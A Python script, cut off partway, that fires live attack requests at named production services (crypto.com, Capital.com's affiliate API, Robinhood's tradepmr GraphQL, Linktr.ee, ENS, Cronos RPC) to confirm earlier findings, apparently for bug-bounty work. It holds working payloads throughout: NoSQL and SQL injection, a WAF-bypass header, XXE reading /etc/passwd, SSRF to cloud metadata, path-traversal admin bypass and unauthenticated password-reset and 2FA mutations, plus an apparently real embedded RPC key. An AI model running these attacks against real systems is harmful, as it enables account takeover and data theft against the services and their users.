#!/usr/bin/env python3
"""Actively revalidate ALL critical/high/medium findings across all targets."""
import asyncio
import json
import re
import sys
import time
import traceback
import httpx
import dns.resolver  # pip install dnspython

TIMEOUT = httpx.Timeout(20.0, connect=15.0)
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
HEADERS = {"User-Agent": UA}
results = []

def record(finding_id, name, severity, domain, status, detail):
    results.append({
        "id": finding_id, "name": name, "severity": severity,
        "domain": domain, "status": status, "detail": detail[:500],
    })
    icon = {"VALID": "✅", "FALSE POSITIVE": "❌", "ERROR": "⚠️", "INCONCLUSIVE": "🔶"}
    print(f"  {icon.get(status,'?')} [{severity.upper()}] {name}: {status}")
    print(f"      {detail[:200]}")

async def safe_get(client, url, **kw):
    try:
        return await client.get(url, **kw)
    except Exception as e:
        return type('R', (), {'status_code': 0, 'text': str(e), 'headers': {}, 'json': lambda: {}})()

async def safe_post(client, url, **kw):
    try:
        return await client.post(url, **kw)
    except Exception as e:
        return type('R', (), {'status_code': 0, 'text': str(e), 'headers': {}, 'json': lambda: {}})()

async def safe_options(client, url, **kw):
    try:
        return await client.options(url, **kw)
    except Exception as e:
        return type('R', (), {'status_code': 0, 'text': str(e), 'headers': {}, 'json': lambda: {}})()


# ═══════════════════════════════════════════════════════════════
# CRITICAL FINDINGS
# ═══════════════════════════════════════════════════════════════

async def validate_critical():
    print("\n" + "="*60)
    print("  CRITICAL FINDINGS VALIDATION")
    print("="*60)

    # ── C1: ENS frensday admin auth bypass ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://frensday.ens.domains/admin")
        has_admin = any(w in r.text.lower() for w in ["ticket", "coupon", "dashboard", "rsvp", "admin"])
        if r.status_code == 200 and has_admin:
            record("C1", "ENS frensday.ens.domains/admin auth bypass", "critical", "app.ens.domains",
                   "VALID", f"HTTP {r.status_code}, admin content found ({len(r.text)}b) - tickets/coupons/dashboard accessible")
        else:
            record("C1", "ENS frensday.ens.domains/admin auth bypass", "critical", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}, no admin content ({len(r.text)}b)")

    # ── C2: ENS frensday admin token bypass ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r_no_token = await safe_get(c, "https://frensday.ens.domains/admin")
        r_token = await safe_get(c, "https://frensday.ens.domains/admin?token=admin")
        r_bad_token = await safe_get(c, "https://frensday.ens.domains/admin?token=anything")
        # If all return same admin content, token param is irrelevant (just open)
        if r_no_token.status_code == 200 and r_token.status_code == 200:
            record("C2", "ENS frensday admin ?token= bypass", "critical", "app.ens.domains",
                   "VALID", f"Admin accessible with any/no token. no_token={len(r_no_token.text)}b, token=admin={len(r_token.text)}b, token=anything={len(r_bad_token.text)}b")
        else:
            record("C2", "ENS frensday admin ?token= bypass", "critical", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r_no_token.status_code}/{r_token.status_code}")

    # ── C3: Capital.com NoSQL auth bypass ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r_normal = await safe_post(c, "https://affiliateapi.cellxpert.com/authenticate/login-as-affiliate",
                                   json={"user": "test@test.com", "pass": "wrong", "url": "Currency"})
        r_nosql = await safe_post(c, "https://affiliateapi.cellxpert.com/authenticate/login-as-affiliate",
                                  json={"user": "administrator", "pass": {"$regex": ".*"}, "url": "Currency"})
        r_nosql2 = await safe_post(c, "https://affiliateapi.cellxpert.com/authenticate/login-as-affiliate",
                                   json={"user": "administrator", "pass": {"$gt": ""}, "url": "Currency"})
        has_token = "token" in r_nosql.text.lower() and r_nosql.status_code == 200
        diff = r_nosql.status_code != r_normal.status_code or len(r_nosql.text) > len(r_normal.text) + 50
        if has_token:
            record("C3", "Capital NoSQL auth bypass (admin)", "critical", "capital.com",
                   "VALID", f"NoSQL returns token! Normal={r_normal.status_code}/{len(r_normal.text)}b, NoSQL={r_nosql.status_code}/{len(r_nosql.text)}b: {r_nosql.text[:200]}")
        elif diff:
            record("C3", "Capital NoSQL auth bypass (admin)", "critical", "capital.com",
                   "INCONCLUSIVE", f"Different responses but no token. Normal={r_normal.status_code}/{len(r_normal.text)}b, $regex={r_nosql.status_code}/{len(r_nosql.text)}b, $gt={r_nosql2.status_code}/{len(r_nosql2.text)}b")
        else:
            record("C3", "Capital NoSQL auth bypass (admin)", "critical", "capital.com",
                   "FALSE POSITIVE", f"Same response. Normal={r_normal.status_code}/{len(r_normal.text)}b, NoSQL={r_nosql.status_code}/{len(r_nosql.text)}b")

    # ── C4: Crypto.com WAF bypass x-test header ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r1 = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                             json={"instrument_name": "BTC_USDT"})
        r2 = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                             json={"instrument_name": "BTC_USDT"},
                             headers={**HEADERS, "x-test": "true"})
        # Test with SQLi payload
        r3 = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                             json={"instrument_name": "BTC_USDT' OR '1'='1"})
        r4 = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                             json={"instrument_name": "BTC_USDT' OR '1'='1"},
                             headers={**HEADERS, "x-test": "true"})
        if r3.status_code == 403 and r4.status_code != 403:
            record("C4", "Crypto.com WAF bypass via x-test header", "critical", "crypto.com",
                   "VALID", f"WAF blocks SQLi ({r3.status_code}) but x-test bypasses ({r4.status_code}). Normal: {r1.status_code}, x-test normal: {r2.status_code}")
        elif r1.status_code == 0 or r2.status_code == 0:
            record("C4", "Crypto.com WAF bypass via x-test header", "critical", "crypto.com",
                   "ERROR", f"Connection failed: {r1.text[:100]}")
        else:
            record("C4", "Crypto.com WAF bypass via x-test header", "critical", "crypto.com",
                   "FALSE POSITIVE", f"No difference. no-header SQLi={r3.status_code}, x-test SQLi={r4.status_code}, normal={r1.status_code}, x-test normal={r2.status_code}")

    # ── C5: Crypto.com SQLi on titan get-ticker ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r_normal = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                                   json={"instrument_name": "BTC_USDT"},
                                   headers={**HEADERS, "x-test": "true"})
        r_sqli = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                                 json={"instrument_name": "BTC_USDT'"},
                                 headers={**HEADERS, "x-test": "true"})
        r_union = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                                  json={"instrument_name": "' UNION SELECT 1--"},
                                  headers={**HEADERS, "x-test": "true"})
        r_bool = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                                 json={"instrument_name": "BTC_USDT' AND '1'='1"},
                                 headers={**HEADERS, "x-test": "true"})
        sql_error = any(w in r_sqli.text.lower() for w in ["sql", "syntax", "query", "mysql", "postgresql", "oracle"])
        diff_status = r_sqli.status_code != r_normal.status_code
        if sql_error:
            record("C5", "Crypto.com SQLi on titan get-ticker", "critical", "crypto.com",
                   "VALID", f"SQL error in response. Normal={r_normal.status_code}, Quote={r_sqli.status_code}: {r_sqli.text[:200]}")
        elif diff_status and r_sqli.status_code == 500:
            record("C5", "Crypto.com SQLi on titan get-ticker", "critical", "crypto.com",
                   "INCONCLUSIVE", f"Quote causes 500 but no SQL error msg. Normal={r_normal.status_code}, Quote={r_sqli.status_code}, UNION={r_union.status_code}, Bool={r_bool.status_code}")
        else:
            record("C5", "Crypto.com SQLi on titan get-ticker", "critical", "crypto.com",
                   "FALSE POSITIVE", f"Normal={r_normal.status_code}, Quote={r_sqli.status_code}, UNION={r_union.status_code}, Bool={r_bool.status_code}")

    # ── C6: Linktr.ee SQS injection ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://ingress.linktr.ee/uLZfGRmpj7",
                            json={"test": "validation_probe"},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and ("SendMessage" in r.text or "MessageId" in r.text):
            record("C6", "Linktr.ee unauthenticated SQS injection", "critical", "linktr.ee",
                   "VALID", f"SQS accepts arbitrary POST: {r.text[:200]}")
        else:
            record("C6", "Linktr.ee unauthenticated SQS injection", "critical", "linktr.ee",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── C7: Merchant.crypto.com Cronos RPC DoS (125K req/sec) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Test dangerous methods
        methods_to_test = ["personal_listAccounts", "personal_unlockAccount", "personal_importRawKey",
                          "personal_newAccount", "txpool_content", "txpool_inspect"]
        working = []
        for method in methods_to_test:
            params = ["test"] if "unlock" in method or "import" in method else []
            r = await safe_post(c, "https://evm.cronos.org",
                               json={"jsonrpc": "2.0", "method": method, "params": params, "id": 1},
                               headers={**HEADERS, "Content-Type": "application/json"})
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "result" in data or "error" in data:
                        working.append(f"{method}={data.get('result', data.get('error',{}).get('message',''))}"[:60])
                except:
                    pass
        # Test batch processing throughput
        batch = [{"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": i} for i in range(50)]
        t0 = time.time()
        r_batch = await safe_post(c, "https://evm.cronos.org",
                                  json=batch, headers={**HEADERS, "Content-Type": "application/json"})
        elapsed = time.time() - t0
        if working:
            record("C7", "Cronos RPC dangerous methods + no rate limit", "critical", "merchant.crypto.com",
                   "VALID", f"{len(working)} methods accessible: {'; '.join(working[:5])}. Batch 50 in {elapsed:.2f}s")
        else:
            record("C7", "Cronos RPC dangerous methods + no rate limit", "critical", "merchant.crypto.com",
                   "FALSE POSITIVE", f"No dangerous methods accessible. Batch status: {r_batch.status_code}")

    # ── C8: BitMEX stored XSS in chat ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        xss_found = []
        for ch in [2, 4, 5, 6, 7]:
            r = await safe_get(c, f"https://testnet.bitmex.com/api/v1/chat?channelID={ch}&count=100&reverse=true")
            if r.status_code == 200:
                patterns = ["<script", "onerror=", "onload=", "javascript:", "<img src=x", "alert(", "prompt(", "</span><script"]
                found = [p for p in patterns if p in r.text]
                if found:
                    xss_found.append(f"Ch{ch}: {','.join(found)}")
        if xss_found:
            record("C8", "BitMEX stored XSS in chat channels", "critical", "testnet.bitmex.com",
                   "VALID", f"XSS in {len(xss_found)} channels: {'; '.join(xss_found)}")
        else:
            record("C8", "BitMEX stored XSS in chat channels", "critical", "testnet.bitmex.com",
                   "FALSE POSITIVE", "No XSS payloads found in chat")

    # ── C9: BitMEX XSS + WebSocket chain ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Test if WebSocket endpoint exists and is public
        r = await safe_get(c, "https://testnet.bitmex.com/api/v1/chat/connected")
        ws_public = r.status_code == 200
        # Already confirmed XSS above, check if WS amplifies
        if ws_public:
            record("C9", "BitMEX XSS+WebSocket mass exploitation chain", "critical", "testnet.bitmex.com",
                   "VALID", f"WebSocket chat endpoint public ({r.status_code}). Combined with stored XSS = broadcast to all connected clients. Connected: {r.text[:100]}")
        else:
            record("C9", "BitMEX XSS+WebSocket mass exploitation chain", "critical", "testnet.bitmex.com",
                   "INCONCLUSIVE", f"WebSocket endpoint returned {r.status_code}. XSS confirmed but WS amplification unclear")

    # ── C10: Vault WebAuthn passkey bypass ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Test if GraphQL accepts queries without auth
        r = await safe_post(c, "https://api.vault.chiatest.net/graphql",
                            json={"query": "{ viewer { id email } }"},
                            headers={**HEADERS, "Content-Type": "application/json"})
        # Test verifyPasskeyAssign mutation
        r2 = await safe_post(c, "https://api.vault.chiatest.net/graphql",
                             json={"query": 'mutation { verifyPasskeyAssign(input: {credentialId: "test", attestationObject: "test", clientDataJSON: "test"}) { success } }'},
                             headers={**HEADERS, "Content-Type": "application/json"})
        gql_works = r.status_code == 200
        mutation_processes = r2.status_code == 200
        if gql_works and mutation_processes:
            record("C10", "Vault WebAuthn passkey bypass", "critical", "vault.chiatest.net",
                   "VALID", f"GraphQL accepts unauth queries ({r.text[:100]}). Mutation processes: {r2.text[:150]}")
        elif gql_works:
            record("C10", "Vault WebAuthn passkey bypass", "critical", "vault.chiatest.net",
                   "INCONCLUSIVE", f"GraphQL works ({r.text[:80]}) but mutation returned {r2.status_code}: {r2.text[:100]}")
        else:
            record("C10", "Vault WebAuthn passkey bypass", "critical", "vault.chiatest.net",
                   "FALSE POSITIVE", f"GraphQL returned {r.status_code}: {r.text[:100]}")


# ═══════════════════════════════════════════════════════════════
# HIGH FINDINGS
# ═══════════════════════════════════════════════════════════════

async def validate_high():
    print("\n" + "="*60)
    print("  HIGH FINDINGS VALIDATION")
    print("="*60)

    # ── H1: ENS Tenderly RPC key exposed ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://mainnet.gateway.tenderly.co/4imxc4hQfRjxrVB2kWKvTo",
                            json={"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and "result" in r.text:
            record("H1", "ENS Tenderly RPC key exposed", "high", "app.ens.domains",
                   "VALID", f"RPC responds: {r.text[:150]}")
        else:
            record("H1", "ENS Tenderly RPC key exposed", "high", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:150]}")

    # ── H2: Capital SQLi on registeraffiliate (company param) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r_normal = await safe_post(c, "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
                                   json={"company": "TestCorp", "email": "test@test.com"})
        r_sqli = await safe_post(c, "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
                                 json={"company": "Test'Corp", "email": "test@test.com"})
        r_escape = await safe_post(c, "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
                                   json={"company": "Test\\'Corp", "email": "test@test.com"})
        sql_err = any(w in r_sqli.text.lower() for w in ["sql", "syntax", "query", "mysql", "unclosed", "unterminated"])
        diff = r_sqli.status_code != r_normal.status_code
        if sql_err:
            record("H2", "Capital SQLi on registeraffiliate (company)", "high", "capital.com",
                   "VALID", f"SQL error: Normal={r_normal.status_code}, Quote={r_sqli.status_code}: {r_sqli.text[:200]}")
        elif diff and r_sqli.status_code == 500:
            record("H2", "Capital SQLi on registeraffiliate (company)", "high", "capital.com",
                   "INCONCLUSIVE", f"500 on quote but no SQL error. Normal={r_normal.status_code}, Quote={r_sqli.status_code}, Escaped={r_escape.status_code}")
        else:
            record("H2", "Capital SQLi on registeraffiliate (company)", "high", "capital.com",
                   "FALSE POSITIVE", f"Normal={r_normal.status_code}, Quote={r_sqli.status_code}, Escaped={r_escape.status_code}")

    # ── H3: Capital SQLi on registeraffiliate (phone param, null byte) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r_normal = await safe_post(c, "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
                                   json={"phone": "1234567890", "email": "test2@test.com"})
        r_null = await safe_post(c, "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
                                 json={"phone": "123%001234", "email": "test2@test.com"})
        r_sqli = await safe_post(c, "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
                                 json={"phone": "123' OR '1'='1", "email": "test2@test.com"})
        if r_sqli.status_code == 500 or (r_null.status_code != r_normal.status_code):
            record("H3", "Capital SQLi on registeraffiliate (phone)", "high", "capital.com",
                   "INCONCLUSIVE", f"Normal={r_normal.status_code}, NullByte={r_null.status_code}, SQLi={r_sqli.status_code}")
        else:
            record("H3", "Capital SQLi on registeraffiliate (phone)", "high", "capital.com",
                   "FALSE POSITIVE", f"Normal={r_normal.status_code}, NullByte={r_null.status_code}, SQLi={r_sqli.status_code}")

    # ── H4: Capital NoSQL on admin-auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://affiliateapi.cellxpert.com/authenticate/admin-auth",
                            json={"user": {"$gt": ""}, "pass": {"$gt": ""}})
        captcha = "captcha" in r.text.lower()
        if captcha:
            record("H4", "Capital NoSQL on admin-auth", "high", "capital.com",
                   "INCONCLUSIVE", f"CAPTCHA blocks: {r.text[:150]}")
        elif r.status_code == 200 and "token" in r.text.lower():
            record("H4", "Capital NoSQL on admin-auth", "high", "capital.com",
                   "VALID", f"Token returned: {r.text[:200]}")
        else:
            record("H4", "Capital NoSQL on admin-auth", "high", "capital.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── H5: Capital path traversal admin bypass ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        paths = ["/partner/..;/admin/", "/partner/..;/v2/adminv2/"]
        hosts = ["https://register.capital.com", "https://cx-new-ui.cellxpert.com"]
        found = []
        for host in hosts:
            for path in paths:
                r = await safe_get(c, host + path)
                if r.status_code == 200 and ("angular" in r.text.lower() or "ng-app" in r.text.lower() or "admin" in r.text.lower()):
                    found.append(f"{host}{path}={r.status_code}/{len(r.text)}b")
        if found:
            record("H5", "Capital path traversal ..;/ admin bypass", "high", "capital.com",
                   "VALID", f"Admin UI exposed: {'; '.join(found[:3])}")
        else:
            record("H5", "Capital path traversal ..;/ admin bypass", "high", "capital.com",
                   "FALSE POSITIVE", "No admin content returned on any path")

    # ── H6: Crypto.com subdomain takeover (ads.crypto.com) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        try:
            r = await c.get("https://ads.crypto.com")
            insta = "instapage" in r.text.lower() or "pageserve" in r.text.lower()
            if r.status_code == 404 and insta:
                record("H6", "Crypto.com subdomain takeover (ads.crypto.com)", "high", "crypto.com",
                       "VALID", f"Instapage 404 — unclaimed, takeover possible. {r.text[:150]}")
            elif insta:
                record("H6", "Crypto.com subdomain takeover (ads.crypto.com)", "high", "crypto.com",
                       "VALID", f"Instapage content on {r.status_code} — takeover possible")
            else:
                record("H6", "Crypto.com subdomain takeover (ads.crypto.com)", "high", "crypto.com",
                       "FALSE POSITIVE", f"HTTP {r.status_code}, no Instapage: {r.text[:100]}")
        except:
            record("H6", "Crypto.com subdomain takeover (ads.crypto.com)", "high", "crypto.com",
                   "FALSE POSITIVE", "Connection failed — domain may be reclaimed")

    # ── H7: Crypto.com SSRF on titan auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r_normal = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/auth",
                                   json={"api_key": "test"})
        r_ssrf = await safe_post(c, "https://api.titan.crypto.com/exchange/v1/public/auth",
                                 json={"api_key": "test", "url": "http://169.254.169.254/latest/meta-data/"})
        if r_ssrf.status_code == 500 and r_normal.status_code != 500:
            record("H7", "Crypto.com SSRF on titan auth", "high", "crypto.com",
                   "INCONCLUSIVE", f"500 on SSRF payload but could be param validation. Normal={r_normal.status_code}, SSRF={r_ssrf.status_code}")
        else:
            record("H7", "Crypto.com SSRF on titan auth", "high", "crypto.com",
                   "FALSE POSITIVE", f"Normal={r_normal.status_code}, SSRF={r_ssrf.status_code}")

    # ── H8: Linktr.ee SQS message injection (various payloads) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Already covered in C6. Test XXE specifically
        r_xxe = await safe_post(c, "https://ingress.linktr.ee/uLZfGRmpj7",
                                content='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                                headers={**HEADERS, "Content-Type": "application/xml"})
        xxe_exfil = "root:" in r_xxe.text
        sqs_queued = "MessageId" in r_xxe.text
        if xxe_exfil:
            record("H8", "Linktr.ee XXE via SQS", "high", "linktr.ee",
                   "VALID", f"XXE data exfiltrated: {r_xxe.text[:200]}")
        elif sqs_queued:
            record("H8", "Linktr.ee XXE via SQS", "high", "linktr.ee",
                   "FALSE POSITIVE", f"XML queued but no entity resolution — SQS doesn't process XXE: {r_xxe.text[:150]}")
        else:
            record("H8", "Linktr.ee XXE via SQS", "high", "linktr.ee",
                   "FALSE POSITIVE", f"HTTP {r_xxe.status_code}: {r_xxe.text[:150]}")

    # ── H9: Linktr.ee second-order XSS/NoSQL/deser/log4j via SQS ──
    # These are all speculative — payloads queued but impact depends on consumer
    record("H9", "Linktr.ee second-order XSS/NoSQL/deser/log4j via SQS", "high", "linktr.ee",
           "INCONCLUSIVE", "Payloads queued to SQS confirmed (C6). Actual impact depends on how SQS consumer processes messages — cannot verify without consumer access. SSRF/XXE/RCE unproven.")

    # ── H10: Merchant.crypto.com GraphQL broken access control ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://pay-api.crypto.com/graphql",
                            json={"query": '{ __type(name: "Team") { name fields { name type { name } } } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        r2 = await safe_post(c, "https://pay-api.crypto.com/graphql",
                             json={"query": 'mutation { createTeam(input: { name: "test", website: "https://test.com", dailyVolume: "TIER1" }) { id } }'},
                             headers={**HEADERS, "Content-Type": "application/json"})
        # Check if mutations process (even with validation errors)
        mutation_processes = r2.status_code == 200 and "unauthenticated" not in r2.text.lower()
        schema_exposed = r.status_code == 200 and "fields" in r.text
        if mutation_processes:
            record("H10", "Merchant crypto.com GraphQL BAC (createTeam)", "high", "merchant.crypto.com",
                   "VALID", f"Mutation processes without auth: {r2.text[:200]}")
        elif schema_exposed:
            record("H10", "Merchant crypto.com GraphQL BAC (createTeam)", "high", "merchant.crypto.com",
                   "INCONCLUSIVE", f"Schema exposed but mutation blocked. Schema: {r.text[:100]}. Mutation: {r2.text[:100]}")
        else:
            record("H10", "Merchant crypto.com GraphQL BAC (createTeam)", "high", "merchant.crypto.com",
                   "FALSE POSITIVE", f"Schema: {r.status_code}/{r.text[:80]}, Mutation: {r2.status_code}/{r2.text[:80]}")

    # ── H11: Cronos RPC (evm.cronos.org + evm-t3.cronos.org) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        endpoints = ["https://evm.cronos.org", "https://evm-t3.cronos.org"]
        methods = ["personal_listAccounts", "personal_newAccount", "personal_unlockAccount",
                   "personal_importRawKey", "txpool_content", "txpool_inspect", "txpool_status"]
        all_results = []
        for ep in endpoints:
            for m in methods:
                params = ["test", "test"] if "unlock" in m or "import" in m else (["test"] if "newAccount" in m else [])
                r = await safe_post(c, ep, json={"jsonrpc": "2.0", "method": m, "params": params, "id": 1},
                                    headers={**HEADERS, "Content-Type": "application/json"})
                if hasattr(r, 'json'):
                    try:
                        d = r.json()
                        if "result" in d and d["result"] is not None:
                            all_results.append(f"{ep.split('//')[1]}:{m}=result")
                        elif "error" in d:
                            msg = d["error"].get("message", "")
                            if "method" not in msg.lower() or "not found" not in msg.lower():
                                all_results.append(f"{ep.split('//')[1]}:{m}=err:{msg[:40]}")
                    except:
                        pass
        if all_results:
            record("H11", "Cronos RPC dangerous methods exposed", "high", "merchant.crypto.com",
                   "VALID", f"{len(all_results)} method/endpoint combos: {'; '.join(all_results[:5])}")
        else:
            record("H11", "Cronos RPC dangerous methods exposed", "high", "merchant.crypto.com",
                   "FALSE POSITIVE", "All dangerous methods return 'method not found'")

    # ── H12: Merchant.crypto.com subdomain takeovers (10 subdomains) ──
    subs = ["ablink.new.crypto.com", "ablink.serviceinfor.crypto.com", "aurora-snapshot.crypto.com",
            "aurora-university-snapshot.crypto.com", "assets.dev.experiences.crypto.com"]
    takeover_candidates = []
    for sub in subs:
        try:
            answers = dns.resolver.resolve(sub, "CNAME")
            cname = str(answers[0].target)
            # Check if CNAME target resolves
            try:
                dns.resolver.resolve(sub, "A")
            except dns.resolver.NXDOMAIN:
                takeover_candidates.append(f"{sub}→{cname}(NXDOMAIN)")
            except dns.resolver.NoAnswer:
                takeover_candidates.append(f"{sub}→{cname}(NoAnswer)")
            except:
                pass
        except dns.resolver.NXDOMAIN:
            takeover_candidates.append(f"{sub}(NXDOMAIN-no-CNAME)")
        except:
            pass
    if takeover_candidates:
        record("H12", "Crypto.com subdomain takeovers", "high", "merchant.crypto.com",
               "VALID", f"{len(takeover_candidates)} vulnerable: {'; '.join(takeover_candidates[:4])}")
    else:
        record("H12", "Crypto.com subdomain takeovers", "high", "merchant.crypto.com",
               "FALSE POSITIVE", "All subdomains resolve properly or don't exist")

    # ── H13: Cronos testnet DoS (method handler crashed) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://evm-t3.cronos.org",
                            json={"jsonrpc": "2.0", "method": "personal_sendTransaction", "params": [{}], "id": 1},
                            headers={**HEADERS, "Content-Type": "application/json"})
        crashed = "crashed" in r.text.lower() or "handler" in r.text.lower()
        if crashed:
            record("H13", "Cronos testnet DoS (method handler crash)", "high", "merchant.crypto.com",
                   "VALID", f"Method handler crashed: {r.text[:200]}")
        else:
            record("H13", "Cronos testnet DoS (method handler crash)", "high", "merchant.crypto.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── H14: Robinhood updatePassword without auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { updatePassword(credentials: {userGuid: "test", emailAddress: "test@test.com", newPassword: "Test123!", forceReset: false}) { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        # If it processes (any response besides 401/403), it's broken auth
        processes = r.status_code == 200 and "forbidden" not in r.text.lower() and "unauthorized" not in r.text.lower()
        if processes:
            record("H14", "Robinhood updatePassword without auth", "high", "robinhood.com",
                   "VALID", f"Mutation processes without auth: {r.text[:200]}")
        else:
            record("H14", "Robinhood updatePassword without auth", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── H15: Robinhood twoFactorSetup without auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { twoFactorSetup(credentials: {cellPhoneNumber: "1234567890", emailAddress: "test@test.com", userName: "test"}) { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        processes = r.status_code == 200 and "forbidden" not in r.text.lower()
        if processes:
            record("H15", "Robinhood twoFactorSetup without auth", "high", "robinhood.com",
                   "VALID", f"Mutation processes without auth: {r.text[:200]}")
        else:
            record("H15", "Robinhood twoFactorSetup without auth", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── H16: Robinhood twoFactor validation without auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { twoFactor(credentials: {code: "123456", emailAddress: "test@test.com"}) { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        validates = r.status_code == 200 and ("not valid" in r.text.lower() or "try again" in r.text.lower() or "success" in r.text.lower())
        if validates:
            record("H16", "Robinhood 2FA validation without auth", "high", "robinhood.com",
                   "VALID", f"2FA validates codes without auth: {r.text[:200]}")
        elif r.status_code == 200 and "forbidden" not in r.text.lower():
            record("H16", "Robinhood 2FA validation without auth", "high", "robinhood.com",
                   "VALID", f"Mutation processes: {r.text[:200]}")
        else:
            record("H16", "Robinhood 2FA validation without auth", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── H17: Robinhood emulate/exitEmulation without auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { exitEmulation { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        processes = r.status_code == 200 and "forbidden" not in r.text.lower()
        if processes:
            record("H17", "Robinhood emulate mutations without auth", "high", "robinhood.com",
                   "VALID", f"exitEmulation processes: {r.text[:200]}")
        else:
            record("H17", "Robinhood emulate mutations without auth", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── H18: Robinhood SSRF via GraphQL iid ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { addOrUpdateSSOUserMapping(input: {iid: "../../evil", userId: "test"}) { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        leaks_url = "fusionapi" in r.text.lower() or "tradepmr" in r.text.lower()
        if leaks_url:
            record("H18", "Robinhood SSRF/path traversal via GraphQL iid", "high", "robinhood.com",
                   "VALID", f"Internal URL leaked: {r.text[:200]}")
        elif r.status_code == 200 and "error" in r.text.lower():
            record("H18", "Robinhood SSRF/path traversal via GraphQL iid", "high", "robinhood.com",
                   "INCONCLUSIVE", f"Error response (may leak info): {r.text[:200]}")
        else:
            record("H18", "Robinhood SSRF/path traversal via GraphQL iid", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── H19: Robinhood JS bundle info disclosure ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
